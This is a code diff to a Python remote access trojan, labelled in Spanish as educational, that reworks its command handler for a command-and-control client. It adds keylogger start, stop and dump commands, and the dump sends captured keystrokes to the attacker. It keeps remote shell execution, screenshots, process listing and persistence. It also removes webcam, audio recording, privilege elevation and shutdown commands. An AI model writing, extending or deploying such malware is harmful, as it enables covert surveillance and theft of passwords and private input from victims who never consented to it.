@@ -5,11 +5,6 @@ Propósito educativo: Entender capacidades típicas de RATs
 
 import os
 import io
-import sys
-import subprocess
-import shutil
-import ctypes
-from PIL import Image
 import asyncio
 
 
@@ -21,7 +16,7 @@ class CommandExecutor:
     def __init__(self, c2_client):
         self.c2 = c2_client
         self.running = True
-        self.active_tasks = {}
+        self.keylogger = None
     
     async def process_queue(self):
         """Procesa cola de comandos asíncronamente"""
@@ -54,17 +49,11 @@ class CommandExecutor:
             'cd': self.cmd_cd,
             'pwd': self.cmd_pwd,
             'cat': self.cmd_cat,
-            'rm': self.cmd_rm,
-            'mkdir': self.cmd_mkdir,
             'processes': self.cmd_processes,
-            'kill': self.cmd_kill,
-            'webcam': self.cmd_webcam,
-            'record': self.cmd_record,
             'keylog': self.cmd_keylog,
+            'keylog_dump': self.cmd_keylog_dump,
+            'broadcast': self.cmd_broadcast,
             'persist': self.cmd_persist,
-            'elevate': self.cmd_elevate,
-            'shutdown': self.cmd_shutdown,
-            'reboot': self.cmd_reboot,
             'exit': self.cmd_exit
         }
         
@@ -88,22 +77,21 @@ class CommandExecutor:
 
 📸 **Captura:**
 `!screenshot` - Captura de pantalla
-`!webcam` - Foto de webcam
-`!record <segundos>` - Grabar audio
 
 ⚙️ **Sistema:**
 `!shell <comando>` - Ejecutar comando shell
 `!processes` - Listar procesos
-`!kill <pid>` - Terminar proceso
 `!info` - Información del sistema
+
+🔍 **Keylogger:**
+`!keylog start` - Iniciar keylogger
+`!keylog stop` - Detener keylogger
+`!keylog_dump` - Obtener teclas capturadas
 
 🔧 **Persistencia:**
 `!persist` - Establecer persistencia
-`!elevate` - Intentar elevación de privilegios
 
 🔄 **Control:**
-`!shutdown` - Apagar sistema
-`!reboot` - Reiniciar sistema
 `!exit` - Cerrar sesión RAT
         """
         await self.c2.send_message(help_text)
@@ -280,6 +268,66 @@ class CommandExecutor:
         except Exception as e:
             await self.c2.send_message(f"❌ Error: {str(e)}")
     
+    async def cmd_keylog(self, args, message):
+        """Controla el keylogger"""
+        if not args:
+            await self.c2.send_message("Uso: `!keylog start` o `!keylog stop`")
+            return
+        
+        action = args[0].lower()
+        
+        if action == 'start':
+            if self.keylogger and self.keylogger.running:
+                await self.c2.send_message("⚠️ Keylogger ya está activo")
+                return
+            
+            from .keylogger import Keylogger
+            self.keylogger = Keylogger()
+            
+            if self.keylogger.start():
+                await self.c2.send_message("🔑 Keylogger **iniciado**")
+            else:
+                await self.c2.send_message("❌ Error iniciando keylogger")
+        
+        elif action == 'stop':
+            if not self.keylogger or not self.keylogger.running:
+                await self.c2.send_message("⚠️ Keylogger no está activo")
+                return
+            
+            if self.keylogger.stop():
+                await self.c2.send_message("🔑 Keylogger **detenido**")
+            else:
+                await self.c2.send_message("❌ Error deteniendo keylogger")
+        
+        else:
+            await self.c2.send_message("Uso: `!keylog start` o `!keylog stop`")
+    
+    async def cmd_keylog_dump(self, args, message):
+        """Envía teclas capturadas al atacante"""
+        if not self.keylogger:
+            await self.c2.send_message("⚠️ Keylogger no ha sido iniciado. Usa `!keylog start`")
+            return
+        
+        status = self.keylogger.get_status()
+        buffer = self.keylogger.get_buffer()
+        
+        if not buffer:
+            await self.c2.send_message("📭 Buffer vacío. No hay teclas capturadas.")
+            return
+        
+        result = f"**Keylogger Dump** ({status['keys_captured']} teclas)\n"
+        result += f"```{buffer[:1800]}```"
+        
+        await self.c2.send_message(result)
+        
+        # Limpiar buffer después de enviar
+        self.keylogger.clear_buffer()
+    
+    async def cmd_broadcast(self, args, message):
+        """Recibe broadcast del atacante (solo informativo)"""
+        # No responde para evitar ruido en el canal
+        pass
+
     async def cmd_persist(self, args, message):
         """Establece persistencia"""
         from .persistence import PersistenceManager
